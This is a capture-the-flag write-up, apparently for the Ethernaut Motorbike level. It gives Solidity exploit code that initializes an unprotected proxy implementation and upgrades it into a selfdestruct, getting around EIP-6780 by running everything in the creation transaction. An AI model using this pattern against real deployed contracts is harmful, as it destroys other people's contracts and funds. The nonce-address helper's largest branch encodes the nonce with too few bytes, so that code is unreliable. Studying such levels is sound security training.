
## Fetching Implementation Address (useful prior to `EIP-6780`)

```js
await web3.eth.getStorageAt(
    contract.address,
    `0x${web3.utils.BN(web3.utils.sha3("eip1967.proxy.implementation")).sub(web3.utils.BN(1)).toString(16)}`
)
// '0x000000000000000000000000c147b4ff63cd11529051981c78aca11d1a41cb2c'
```

## Dealing With [EIP-6780](https://eips.ethereum.org/EIPS/eip-6780)

We need to call the `selfdestruct` during the contract creation transaction,
<br>
otherwise the opcode would have no affect.

```js
ethernaut = '0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6'
level = '0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6'
nonce = await web3.eth.getTransactionCount(level) // 3461
```

Now we would use these params to call `BypassEIP6780`.

##

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IEthernaut {
    function createLevelInstance(address _level) external;
    function submitLevelInstance(address _instance) external;
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract BypassEIP6780 {
    IEthernaut public ethernaut;
    address public motorbike;
    address public engine;

    constructor(address _ethernaut, address _level, uint256 _levelNonce) {
        ethernaut = IEthernaut(_ethernaut);
        engine = computeContractAddress(_level, _levelNonce);
        motorbike = computeContractAddress(_level, _levelNonce + 1);
        ethernaut.createLevelInstance(_level);
        new MotorbikeSolution().destructEngine(engine);
    }

    function computeContractAddress(address _creator, uint256 _nonce) private pure returns (address) {
        if (_nonce == 0) {
            // RLP encoding for the address and nonce 0 case
            return address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                _creator,
                bytes1(0x80)
            )))));
        }
        if (_nonce <= 0x7f) {
            // Nonce is 1 byte
            return address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                _creator,
                uint8(_nonce)
            )))));
        }
        if (_nonce <= 0xff) {
            // Nonce is 2 bytes
            return address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xd7),
                bytes1(0x94),
                _creator,
                uint8(0x81),
                uint8(_nonce)
            )))));
        }
        if (_nonce <= 0xffff) {
            // Nonce is 3 bytes
            return address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xd8),
                bytes1(0x94),
                _creator,
                bytes1(0x82),
                uint16(_nonce)
            )))));
        }
        if (_nonce <= 0xffffff) {
            // Nonce is 3 bytes
            return address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xd9),
                bytes1(0x94),
                _creator,
                bytes1(0x83),
                uint16(_nonce)
            )))));
        }
        revert("Nonce too high");
    }

    function submitLevel() external {
        ethernaut.submitLevelInstance(motorbike);
    }
}

contract MotorbikeSolution {
    function destructEngine(address _engine) external {
        IEngine e = IEngine(_engine);
        e.initialize();
        e.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(payable(tx.origin));
    }
}
```

## Submitting Level

Submit the level via `BypassEIP6780.submitLevel()`.

#### NOTE:
The `level instance` will belong to `BypassEIP6780` contract and not to the EOA player.
<br>
Therefore the solution will not be recorded under the player's EOA :(
<br>
Creating a `"middleman"` contract that will do a delegate call to create the `level instance` will not work since it would update the `"middleman"` contract's storage rather than the storage of the `ethernaut` contract (as we saw earlier).
